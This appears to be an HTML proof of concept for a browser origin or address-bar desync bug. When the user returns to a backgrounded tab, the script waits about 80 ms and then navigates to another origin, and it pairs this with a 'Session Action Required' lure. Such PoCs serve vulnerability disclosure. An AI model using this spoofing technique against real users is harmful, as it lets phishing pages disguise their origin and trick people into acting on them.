<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  font-size:17px;
  padding:12px 18px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}

#card {
  display:none;
  max-width:420px;
  margin:80px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

.meta {
  font-size:14px;
  color:#666;
  margin-bottom:12px;
}

.origin {
  font-family:monospace;
  background:#eee;
  padding:6px 8px;
  border-radius:8px;
  margin-top:8px;
  font-size:13px;
}

.action {
  margin-top:20px;
  background:#34c759;
}
</style>
</head>

<body>

<div style="padding:40px;text-align:center">
  <button id="start">Start PoC</button>
</div>

<div id="card">
  <h2>Session Action Required</h2>
  <div class="meta">
    Page content updated.<br>
    Observe address bar vs content.
  </div>

  <div class="origin">
    document.location.origin:<br>
    <span id="origin"></span>
  </div>

  <button class="action" onclick="alert('User action executed')">
    Continue
  </button>
</div>

<script>
const start = document.getElementById('start');
const card  = document.getElementById('card');
const originLabel = document.getElementById('origin');

start.onclick = () => {
  history.pushState({}, '', '/initial');
  card.style.display = 'block';
  originLabel.textContent = location.origin;

  // wait for user to background tab
};

document.addEventListener('visibilitychange', () => {
  if (!document.hidden) {
    // returning from tab overview
    originLabel.textContent = location.origin;

    // delay navigation slightly to allow UI desync
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'http://google.com:9000';
      }, 80);
    });
  }
});
</script>

</body>
</html>
